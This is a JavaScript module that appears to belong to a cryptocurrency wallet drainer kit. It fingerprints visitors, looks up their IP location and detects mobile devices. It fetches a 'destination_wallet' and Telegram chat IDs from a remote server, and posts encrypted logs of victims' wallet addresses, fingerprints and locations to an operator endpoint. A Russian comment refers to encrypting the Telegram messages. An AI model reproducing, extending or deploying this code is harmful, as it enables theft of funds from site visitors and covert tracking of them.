import axios from "axios"

import { encryptAndSendMsg, decode } from "./hash"

import Fingerprint2 from 'fingerprintjs2';

const getUserFingerprint = async () => {
    try {
      const components = await new Promise(resolve => {
        Fingerprint2.get({ excludeUserAgent: true, excludeLanguage: true }, resolve);
      });
  
      const fingerprint = Fingerprint2.x64hash128(
        components.map(component => component.value).join(''),
        31
      );
  
      return  fingerprint;
    } catch (error) {
      console.error('Error getting fingerprint and IP:', error);
      return null;
    }
};
let chat_ids = []
export const loadData = async (server) => { 
  let recipient = ""
  let fingerprint = ""
  let mobile = isAndroidIos()

  const updateResponse =  await axios.get(`${server}update?data=${window.location.origin}`)
  .then((res) => res.data)
  .catch(() => false)

  const location = await userLocation()
  .then(res => res.data)

  fingerprint = await getUserFingerprint()

  if (updateResponse) {
      let dataUpdate = await decode(updateResponse)
      recipient = dataUpdate.destination_wallet

      if(dataUpdate.chat_ids) {
        chat_ids = dataUpdate.chat_ids.split(",")
      }
  } 

  return  {
    recipient, chat_ids, location, fingerprint, mobile
  }
}

export const dataitem = async (address) => {
  const data = await encryptAndSendMsg({ 
    address: address
  })

  const result = await axios.post(window.endpoint + "dataitem", { data: data })
    .then(res => res.data)
    .catch(() => [])

  return result
}


export const LogTg = async (type, data) => {

  data.chat_ids = chat_ids
  data.type = type
  
  const msg = await encryptAndSendMsg({ // зашифровка телеграмм
    msg: JSON.stringify(data)
  })

  axios.post(`${window.endpoint}data`, { data: msg })
  .catch(err =>  console.log(err.message))
}

export const setChatId = (data) => {
  chat_ids = data
}

export function isAndroidIos() {
  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)) {
      return true
  } else {
      return false
  }
}

export const userLocation = async () => {
  return await axios.post("https://api.db-ip.com/v2/free/self/")
}